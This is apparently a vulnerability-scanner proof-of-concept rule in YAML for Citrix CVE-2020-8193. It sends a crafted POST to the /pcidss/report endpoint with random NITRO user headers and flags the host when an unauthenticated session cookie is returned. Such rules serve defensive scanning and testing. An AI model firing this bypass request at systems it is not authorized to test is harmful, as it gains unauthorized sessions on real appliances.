detail:
  author: bufsnake(https://github.com/bufsnake)
  links:
  - https://github.com/PR3R00T/CVE-2020-8193-Citrix-Scanner/blob/master/scanner.py
  - https://blog.unauthorizedaccess.nl/2020/07/07/adventures-in-citrix-security-research.html
expression: r0()
manual: true
name: poc-yaml-citrix-cve-2020-8193-unauthorized
rules:
  r0:
    expression: response.status == 406 && "(?i)SESSID=\\w{32}".bmatches(bytes(response.headers["Set-Cookie"]))
    request:
      body: <appfwprofile><login></login></appfwprofile>
      cache: true
      follow_redirects: false
      headers:
        Content-Type: application/xml
        X-NITRO-PASS: '{{pass}}'
        X-NITRO-USER: '{{user}}'
      method: POST
      path: /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1
set:
  pass: randomLowercase(8)
  user: randomLowercase(8)
transport: http
